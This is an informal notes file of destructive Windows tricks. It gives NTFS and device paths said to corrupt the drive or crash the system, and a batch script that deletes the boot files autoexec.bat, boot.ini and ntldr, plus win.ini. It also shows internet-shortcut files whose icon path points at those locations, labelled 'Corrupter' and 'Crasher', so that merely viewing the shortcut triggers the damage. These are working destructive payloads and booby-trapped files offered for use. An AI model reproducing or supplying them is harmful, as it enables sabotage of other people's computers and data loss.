Batch file commands:

cd C:/:$i30:$bitmap                             may corrupt your ntfs drive

//./GLOBALROOT/Device/ConDrv/KernelConnect      may crash your computer

@echo off
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini                          may stop your computer from functioning


Other Notes:
The undeletable folder could possibly be deleted with cmd, (haven't tested)
You can implement:
 
 
SHORTCUT FILES: 
 
 C:/:$i30:$bitmap                                              :Corrupter
 //./GLOBALROOT/Device/ConDrv/KernelConnect                    :Crasher
  
 eg.
 [{000214A0-0000-0000-C000-000000000046}]
Prop3=19,11
[InternetShortcut]
IDList=
URL=https://google.com/
IconIndex=2
HotKey=0
IconFile=\\.\globalroot\device\condrv\kernelconnect

[{000214A0-0000-0000-C000-000000000046}]
Prop3=19,11
[InternetShortcut]
IDList=
URL=https://google.com/
IconIndex=2
HotKey=0
IconFile=C:/:$i30:$bitmap
